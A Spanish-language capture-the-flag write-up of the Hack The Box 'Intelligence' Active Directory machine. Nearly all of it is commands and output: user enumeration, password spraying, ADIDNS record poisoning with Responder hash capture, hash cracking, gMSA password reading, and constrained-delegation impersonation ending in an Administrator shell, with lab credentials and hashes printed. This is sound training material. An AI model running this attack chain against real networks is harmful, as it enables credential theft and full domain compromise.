# Enumeration

>Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ sudo AutoNmap.sh 10.129.95.154
AutoNmap By JBKira
Puertos TCP abiertos:
53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49667,49691,49692,49711,49726
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Intelligence
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-20 23:59:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-21T00:01:10+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
|_SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-21T00:01:10+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
|_SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-21T00:01:10+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
|_SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
|_SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
|_ssl-date: 2025-04-21T00:01:10+00:00; +7h00m01s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
| smb2-time: 
|   date: 2025-04-21T00:00:32
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m00s
```

> Vamos a enumerar la versión de Windows y el dominio de Active Directory empleando crackmapexec:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ crackmapexec smb 10.129.95.154 2>/dev/null
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
```

> Vamos a agregar el dominio a nuestro resolutor local (/etc/hosts) para que pueda resolver el nombre de dominio:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ echo "10.129.95.154 DC.intelligence.htb intelligence.htb" >> /etc/hosts
```

>Si visitamos el servicio web alojado en el puerto 80 podemos ver lo siguiente:

![image](https://github.com/user-attachments/assets/69e81dfc-993d-4507-9418-3a99b22168d5)

>Si seguimos analizando la página vemos los siguientes dos PDF con un botón de descarga:

```URL
http://10.129.95.154/documents/2020-01-01-upload.pdf
http://10.129.95.154/documents/2020-12-15-upload.pdf
```

>Al descargar uno de ellos y revisar sus metadatos vemos un posible usuario en el campo Creator: 'Jose.Williams'

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ wget http://10.129.95.154/documents/2020-12-15-upload.pdf

<SNIP>

2025-04-20 13:04:20 (516 KB/s) - ‘2020-12-15-upload.pdf’ saved [27242/27242]

┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ exiftool 2020-12-15-upload.pdf 
ExifTool Version Number         : 13.10
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2025:04:20 13:04:20-04:00
File Inode Change Date/Time     : 2025:04:20 13:04:20-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
```

>Emplearemos el siguiente script para fuzzear por más archivos pdf y descargarlos y revisar sus metadatos con exiftools:

```bash
#!/bin/bash

for month in {01..12}; do
  for day in {01..31}; do
    url="http://10.129.95.154/documents/2020-$month-$day-upload.pdf"
    if curl -s --head "$url" | grep -i "HTTP/1.1 200 OK" > /dev/null; then
      filename="2020-$month-$day-upload.pdf"
      curl -s -O "$url" && exiftool -j "$filename" >> exiftool_output.json
    fi
  done
done
```

>Esto nos generará un archivo JSON que contiene los metadatos de cada pdf encontrado, vamos a tratarlo para obtener los valores únicos del campo Creator para crear una lista de posibles usuarios válidos del dominio:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ cat exiftool_output.json | grep "Creator" | awk '{print $2}' FS=":" | tr -d ' "' | sort -u
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
```

>Ahora vamos a emplear la herramienta kerbrute para ver que usuarios son válidos en el dominio:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ kerbrute userenum --dc 10.129.95.154 -v valid_users -d INTELLIGENCE.HTB | grep '[+]'
2025/04/20 13:15:54 >  [+] VALID USERNAME:       David.Wilson@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Ian.Duncan@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       David.Reed@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       David.Mcbride@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Brian.Morris@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Darryl.Harris@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Daniel.Shelton@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Brian.Baker@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Danny.Matthews@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Anita.Roberts@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Jason.Patterson@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Nicole.Brock@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Richard.Williams@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Kelly.Long@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Jessica.Moody@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Jennifer.Thomas@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       John.Coleman@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Jason.Wright@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Jose.Williams@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Samuel.Richardson@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Stephanie.Young@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Thomas.Hall@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Scott.Scott@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Teresa.Williamson@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Thomas.Valenzuela@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Veronica.Patel@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       William.Lee@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Travis.Evans@INTELLIGENCE.HTB
2025/04/20 13:15:54 >  [+] VALID USERNAME:       Tiffany.Molina@INTELLIGENCE.HTB
```

>Ahora vamos a intentar hacer un ASREP-ROAST pero no da resultados ya que ningún usuario tiene la preautenticación por kerberos deshabilitada:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ impacket-GetNPUsers -no-pass -usersfile valid_users intelligence.htb/ 2>/dev/null
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Anita.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Baker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Morris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Daniel.Shelton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Danny.Matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darryl.Harris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Mcbride doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ian.Duncan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Patterson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jennifer.Thomas doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jessica.Moody doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User John.Coleman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kaitlyn.Zimmerman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kelly.Long doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nicole.Brock doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Richard.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Samuel.Richardson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Scott.Scott doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Stephanie.Young doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Teresa.Williamson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Hall doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Valenzuela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tiffany.Molina doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Travis.Evans doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
```

>Si probamos a hacer un Password Spray con todas las cuentas empleando como contraseña su propio nombre vemos que ninguna lo posee:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ kerbrute passwordspray --dc 10.129.95.154 --user-as-pass -d INTELLIGENCE.HTB valid_users  

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/20/25 - Ronnie Flathers @ropnop

2025/04/20 13:19:13 >  Using KDC(s):
2025/04/20 13:19:13 >   10.129.95.154:88

2025/04/20 13:19:14 >  Done! Tested 30 logins (0 successes) in 0.424 seconds
```

>Vamos a seguir analizando los pdfs, nos falta por ver su contenido por lo que vamos a emplear una herramienta para unir todos los pdf y luego lo veremos completo de forma más cómoda:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ pdfunite 2020* unido.pdf
```

>Lo abrimos con evince:

```bash
evince unido.pdf
```

>Encontramos en una página información que contiene una contraseña por defecto para las cuentas creadas: `NewIntelligenceCorpUser9876`

![image](https://github.com/user-attachments/assets/41448674-c97b-4f90-ba15-4b317e27e89e)

>Ahora vamos a de nuevo realizar un Password Spray pero esta vez empleando esta contraseña, donde vemos que tenemos una cuenta con estas credenciales: `Tiffany.Molina:NewIntelligenceCorpUser9876`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ crackmapexec smb 10.129.95.154 -u valid_users -p 'NewIntelligenceCorpUser9876' 2>/dev/null  
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
<SNIP>
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
```

>Vamos a emplear sus credenciales para obtener archivos de bloodhound:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ bloodhound-python -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -ns 10.129.95.154 -d intelligence.htb -c all 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc.intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.intelligence.htb
INFO: Done in 00M 11S

```

>Abrimos bloodhound, encendemos el servicio neo4j e importamos los archivos resultantes al programa:

```bash
sudo neo4j start
bloodhound &>/dev/null & disown
```

>Al analizarlos, vemos que con el usuario que tenemos actualmente no hay mucho que podamos hacer.

>Vamos a analizar los shares compartidos con nuestro usuario y vemos uno interesante llamado IT:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ smbclient -L \\\\10.129.95.154\\ -U "Tiffany.Molina%NewIntelligenceCorpUser9876"

      Sharename       Type      Comment
      ---------       ----      -------
      ADMIN$          Disk      Remote Admin
      C$              Disk      Default share
      IPC$            IPC       Remote IPC
      IT              Disk      
      NETLOGON        Disk      Logon server share 
      SYSVOL          Disk      Logon server share 
      Users           Disk      

```

>Si nos conectamos vemos un script de powershell que vamos a descargar para analizarlo:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ smbclient \\\\10.129.95.154\\IT -U "Tiffany.Molina%NewIntelligenceCorpUser9876"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

       3770367 blocks of size 4096. 1458796 blocks available
smb: \> get downdetector.ps1
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (4.3 KiloBytes/sec) (average 4.3 KiloBytes/sec)
```

>Vemos que este script realiza llamadas a los servidores web cada 5 minutos que tengan un RR en el servidor DNS del dominio:

```powershell
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ cat downdetector.ps1                                                                              
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}

```

>Cabe destacar que podemos obtener la user.txt flag desde el share USERS:

```bash
smb: \Tiffany.Molina\Desktop\> ls
  .                                  DR        0  Sun Apr 18 20:51:46 2021
  ..                                 DR        0  Sun Apr 18 20:51:46 2021
  user.txt                           AR       34  Sun Apr 20 19:56:31 2025
```

>Ahora, vamos a emplear la siguiente herramienta: https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py Para intentar crear un RR en el Active Directory Integrated DNS (ADIDNS) para que el script nos envíe una solicitud a nosotros y podamos obtener el hash del usuario que realiza las peticiones:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence/krbrelayx]
└─$ python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --action add --record web_jbkira --data 10.10.14.133 --type A DC.intelligence.htb -dns-ip 10.129.95.154
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

>Ahora abrimos responder y esperamos a que nos envíe la solicitud el script:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence/krbrelayx]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

<SNIP>

[+] Listening for events...                                                                                                                                                 

[HTTP] NTLMv2 Client   : 10.129.95.154
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:d46ac007bcd4e889:028AFF7DD77B07E2560C0E749C51064E:01010000000000009DAEB48759B2DB0111EE71D88392F0C10000000002000800540045004800520001001E00570049004E002D00460045004E0044004D0043004E003400350047004D000400140054004500480052002E004C004F00430041004C0003003400570049004E002D00460045004E0044004D0043004E003400350047004D002E0054004500480052002E004C004F00430041004C000500140054004500480052002E004C004F00430041004C0008003000300000000000000000000000002000007F46D64220921B8420939FC1800E1BC1484A3D6F9AC2817024DB1B931D2B4A7D0A001000000000000000000000000000000000000900400048005400540050002F007700650062005F006A0062006B006900720061002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

>Este hash podemos crackearlo con hashcat empleando la máscara 5600 que corresponde a los hashes NTLMv2, dándonos las credenciales `Ted.Graves:Mr.Teddy`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ hashcat -m 5600 ntlmv2 /usr/share/wordlists/rockyou.txt        
hashcat (v6.2.6) starting

<SNIP>

TED.GRAVES::intelligence:d46ac007bcd4e889:028aff7dd77b07e2560c0e749c51064e:01010000000000009daeb48759b2db0111ee71d88392f0c10000000002000800540045004800520001001e00570049004e002d00460045004e0044004d0043004e003400350047004d000400140054004500480052002e004c004f00430041004c0003003400570049004e002d00460045004e0044004d0043004e003400350047004d002e0054004500480052002e004c004f00430041004c000500140054004500480052002e004c004f00430041004c0008003000300000000000000000000000002000007f46d64220921b8420939fc1800e1bc1484a3d6f9ac2817024db1b931d2b4a7d0a001000000000000000000000000000000000000900400048005400540050002f007700650062005f006a0062006b006900720061002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
```
# Privilege Escalation

>Si revisamos de nuevo Bloodhound podemos ver que este usuario pertenece a un grupo que contiene las ACL ReadGMSAPassword de la cuenta SVC_INT$

![image](https://github.com/user-attachments/assets/4873ca59-9bba-4e9b-a9f5-d0df61347c07)

>Esto podemos explotarlo de la siguiente forma empleando BloodyAD, dándonos acceso a su hash NTLM:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ bloodyAD -d intelligence.htb -u 'Ted.Graves' -p 'Mr.Teddy' --host dc.intelligence.htb --dc-ip 10.129.95.154 get object SVC_INT\$ --attr msDS-ManagedPassword  

distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b05dfb2636385604c6d36b0ca61e35cb
msDS-ManagedPassword.B64ENCODED: IpailWQkt8x5/D2nMIjqFfVielcPrG+pohbum1ojS1bgZ+RNTEU/U/59gfk2AmIdH4H+q3wLH1NTYdN78dtmuzidT7LL4b76o3AUJKba30TEZ/oEkJCQ3duEI4tkrXewVr1pqMdPcpC06UhY/ju/mfSZUPcJtTbzgmgT6RcrNgA+eNfM1A2f7IduliV5UKazq0YK2RgmohyTlCQEq2sYoFPPHtxZxp2HyhuIioLj477aJlL41AuA/5y+jf0+FmlPuSS5BpAHvjBIe8vkVFKa9O1V9qgH6f3uKsCCKuBj9Ptgd3yXFQNc5Ipv8C4rRGO82SCgjmvWVsF7nBflj94wRA==
```

>Cuando verificamos en Bloodhound los permisos de este usuario vemos el permiso AllowedToDelegate sobre el DC, empleando el SPN WWW/dc.intelligence.htb:

![image](https://github.com/user-attachments/assets/7cbaec1b-94c6-47da-9e7f-cb8bad57f9b1)
![image](https://github.com/user-attachments/assets/cf09e06a-3712-4890-a3e0-c9dab1393ba1)


>Este permiso nos permite obtener un ticket de kerberos de otro usuario mediante S4U2Proxy permitiendonos impersonar a cualquier usuario del DC, para ello emplearemos la herramienta de impacket siguiente:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' 'intelligence.htb/SVC_INT$' -hashes 'aad3b435b51404eeaad3b435b51404ee:b05dfb2636385604c6d36b0ca61e35cb' 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

>Ahora importaremos el ticket resultante para poder hacer un Pass-The-Ticket:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

>Ahora realizamos un Pass-The-Ticket para obtener una shell mediante wmiexec como el usuario impersonado, es decir, administrador:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/intelligence]
└─$ impacket-wmiexec -k -dc-ip 10.129.95.154 dc.intelligence.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator
```

>Por último, aquí podemos ver la flag root.txt:

```powershell
C:\>dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is E3EF-EBBD

 Directory of C:\Users\Administrator\Desktop

04/18/2021  05:51 PM    <DIR>          .
04/18/2021  05:51 PM    <DIR>          ..
04/20/2025  04:56 PM                34 root.txt
```
